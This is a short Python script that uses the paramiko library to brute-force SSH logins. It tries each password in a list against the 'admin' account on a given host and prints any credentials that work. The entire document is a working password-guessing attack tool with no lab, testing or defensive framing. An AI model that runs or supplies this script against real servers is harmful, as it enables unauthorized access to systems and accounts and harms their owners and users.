import paramiko

def brute_force_ssh(hostname, username, password_list):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for password in password_list:
        try:
            client.connect(hostname, username=username, password=password)
            print(f"Successful login! Username: {username}, Password: {password}")
            break
        except paramiko.AuthenticationException:
            print(f"Failed login. Username: {username}, Password: {password}")
        except paramiko.SSHException as e:
            print(f"An error occurred: {str(e)}")

    client.close()

hostname = 'example.com'
username = 'admin'
password_list = ['password1', 'password2', 'password3', 'admin123']

brute_force_ssh(hostname, username, password_list)
